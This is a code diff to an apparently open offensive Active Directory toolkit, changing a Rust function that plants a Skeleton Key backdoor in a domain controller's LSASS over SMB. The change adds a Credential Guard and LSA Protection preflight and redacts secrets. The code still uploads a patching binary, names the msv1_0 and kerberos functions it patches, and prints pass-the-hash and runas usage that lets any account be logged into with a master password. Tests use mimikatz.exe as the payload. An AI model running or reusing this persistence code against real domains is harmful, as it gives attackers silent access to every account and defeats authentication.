@@ -25,6 +25,9 @@
 //! 6. Delete uploaded binary and temp service
 
 use overthrone_core::error::{OverthroneError, Result};
+use overthrone_core::postex::{
+    SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_skeleton_key_preflight_from_registry,
+};
 use overthrone_core::proto::smb::SmbSession;
 use tracing::{debug, info, warn};
 
@@ -57,7 +60,7 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     }
 
     // Validate credentials and establish SMB session
-    let smb = match (&config.password, &config.nt_hash) {
+    let mut smb = match (&config.password, &config.nt_hash) {
         (Some(pw), _) => {
             info!(
                 "[skeleton] Connecting to {} via SMB (password)",
@@ -93,18 +96,53 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         }
     };
 
+    if config.payload_path.is_some() && config.skeleton_master_password.is_none() {
+        return Err(OverthroneError::TicketForge(
+            "Skeleton Key execution requires an explicit skeleton_master_password; refusing to generate an operator secret for a live LSASS patch"
+                .into(),
+        ));
+    }
+
     let master_password = config.skeleton_master_password.clone().unwrap_or_else(|| {
         let random = rand::random::<u64>();
         let pw = format!("{:016x}", random);
-        warn!(
-            "[skeleton] No skeleton_master_password configured — generated random: {}",
-            pw
-        );
+        warn!("[skeleton] No skeleton_master_password configured; generated metadata-only secret and will not log it");
         pw
     });
-    let master_hash = compute_skeleton_ntlm(&master_password);
+    let _master_hash = compute_skeleton_ntlm(&master_password);
+    debug!("[skeleton] Master NTLM hash computed and redacted from logs");
 
-    debug!("[skeleton] Master NTLM hash: {}", hex::encode(&master_hash));
+    info!(
+        "[skeleton] Running Credential Guard / LSA Protection preflight on {}",
+        config.dc_ip
+    );
+    let preflight =
+        assess_skeleton_key_preflight_from_registry(&mut smb, config.dc_ip.clone()).await;
+    match preflight.status {
+        SkeletonKeyPreflightStatus::Blocked => {
+            warn!(
+                "[skeleton] Refusing LSASS patch on {}: {:?}",
+                config.dc_ip, preflight.warnings
+            );
+            return Ok(preflight_refusal_result(config, &preflight));
+        }
+        SkeletonKeyPreflightStatus::Unknown if config.payload_path.is_some() => {
+            warn!(
+                "[skeleton] Refusing LSASS patch on {} because preflight is inconclusive: {:?}",
+                config.dc_ip, preflight.warnings
+            );
+            return Ok(preflight_refusal_result(config, &preflight));
+        }
+        SkeletonKeyPreflightStatus::Unknown => {
+            warn!(
+                "[skeleton] Preflight inconclusive; continuing metadata-only flow: {:?}",
+                preflight.warnings
+            );
+        }
+        SkeletonKeyPreflightStatus::Allowed => {
+            info!("[skeleton] Preflight passed for {}", config.dc_ip);
+        }
+    }
 
     // ── Step 1: Verify admin access ────────────────────────────
     info!("[skeleton] Verifying admin access on {}", config.dc_ip);
@@ -187,35 +225,33 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     let details = if executed {
         format!(
             "Skeleton Key injected on {}:\n\
-             - Master password: '{}'\n\
-             - Master NTLM: {}\n\
+             - Preflight: {}\n\
+             - Master password: configured (redacted)\n\
+             - Master NTLM: redacted\n\
              - Patches: msv1_0!MsvpPasswordValidate + kerberos!CDLocateCSystem\n\
              - All accounts accept both real password AND master password\n\
              - Survives until DC reboot\n\n\
              Execution output:\n{}\n\n\
              Usage:\n\
-             - Any user: runas /user:{}\\AnyUser /netonly cmd (password: '{}')\n\
-             - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:{}",
+             - Any user: runas /user:{}\\AnyUser /netonly cmd (password: <operator-provided-master-password>)\n\
+             - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:<redacted-master-ntlm>",
             config.dc_ip,
-            master_password,
-            hex::encode(&master_hash),
+            preflight.summary(),
             output,
             config.domain,
-            master_password,
-            config.domain,
-            hex::encode(&master_hash)
+            config.domain
         )
     } else {
         format!(
             "Skeleton Key metadata (NOT EXECUTED — no payload_path):\n\
              - Target: {}\n\
+             - Preflight: {}\n\
              - Admin access: VERIFIED\n\
-             - Master password: '{}'\n\
-             - Master NTLM: {}\n\
+             - Master password: generated/configured (redacted)\n\
+             - Master NTLM: redacted\n\
              - To execute: set config.payload_path to a patching binary",
             config.dc_ip,
-            master_password,
-            hex::encode(&master_hash)
+            preflight.summary()
         )
     };
 
@@ -233,8 +269,8 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         }),
         message: if executed {
             format!(
-                "Skeleton Key injected on {} — master password: '{}'",
-                config.dc_ip, master_password
+                "Skeleton Key injected on {} (master secret redacted)",
+                config.dc_ip
             )
         } else {
             format!(
@@ -243,6 +279,32 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
             )
         },
     })
+}
+
+fn preflight_refusal_result(config: &ForgeConfig, preflight: &SkeletonKeyPreflight) -> ForgeResult {
+    ForgeResult {
+        action: "Skeleton Key".into(),
+        domain: config.domain.clone(),
+        success: false,
+        ticket_data: None,
+        persistence_result: Some(PersistenceResult {
+            mechanism: "Skeleton Key (LSASS patch)".into(),
+            target: config.dc_ip.clone(),
+            success: false,
+            details: format!(
+                "{}\nWarnings:\n- {}\nEvidence:\n- {}",
+                preflight.summary(),
+                preflight.warnings.join("\n- "),
+                preflight.evidence.join("\n- ")
+            ),
+            cleanup_command: None,
+        }),
+        message: format!(
+            "Skeleton Key refused on {}: {}",
+            config.dc_ip,
+            preflight.warnings.join("; ")
+        ),
+    }
 }
 
 /// Compute NTLM hash of the skeleton master password.
@@ -255,4 +317,79 @@ fn compute_skeleton_ntlm(password: &str) -> Vec<u8> {
     let mut hasher = Md4::new();
     hasher.update(&utf16);
     hasher.finalize().to_vec()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::runner::ForgeAction;
+    use overthrone_core::postex::{
+        SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_lsa_protection_values,
+    };
+
+    fn base_config() -> ForgeConfig {
+        ForgeConfig {
+            dc_ip: "10.0.0.10".into(),
+            domain: "corp.local".into(),
+            username: "administrator".into(),
+            password: Some("Password123!".into()),
+            nt_hash: None,
+            action: ForgeAction::SkeletonKey,
+            krbtgt_hash: None,
+            krbtgt_aes256: None,
+            service_hash: None,
+            domain_sid: None,
+            impersonate: None,
+            user_rid: 500,
+            group_rids: vec![],
+            extra_sids: vec![],
+            lifetime_hours: 10,
+            output_path: None,
+            payload_path: Some("mimikatz.exe".into()),
+            skeleton_master_password: Some("NeverPrintThis!".into()),
+        }
+    }
+
+    #[test]
+    fn test_preflight_refusal_result_includes_evidence_without_secret() {
+        let config = base_config();
+        let preflight: SkeletonKeyPreflight =
+            assess_lsa_protection_values(config.dc_ip.clone(), Some(1), Some(0));
+        let result = preflight_refusal_result(&config, &preflight);
+
+        assert!(!result.success);
+        assert!(result.message.contains("Skeleton Key refused"));
+        assert!(!result.message.contains("NeverPrintThis"));
+
+        let details = result.persistence_result.unwrap().details;
+        assert!(details.contains("LsaCfgFlags"));
+        assert!(details.contains("Credential Guard"));
+        assert!(!details.contains("NeverPrintThis"));
+    }
+
+    #[test]
+    fn test_unknown_preflight_is_represented_as_refusal() {
+        let config = base_config();
+        let preflight = SkeletonKeyPreflight {
+            target: config.dc_ip.clone(),
+            status: SkeletonKeyPreflightStatus::Unknown,
+            credential_guard_enabled: false,
+            lsa_protection_enabled: false,
+            lsa_cfg_flags: None,
+            run_as_ppl: None,
+            warnings: vec!["remote registry unavailable".into()],
+            evidence: vec!["WINREG bind failed".into()],
+        };
+
+        let result = preflight_refusal_result(&config, &preflight);
+        assert!(!result.success);
+        assert!(result.message.contains("remote registry unavailable"));
+        assert!(
+            result
+                .persistence_result
+                .unwrap()
+                .details
+                .contains("WINREG bind failed")
+        );
+    }
 }
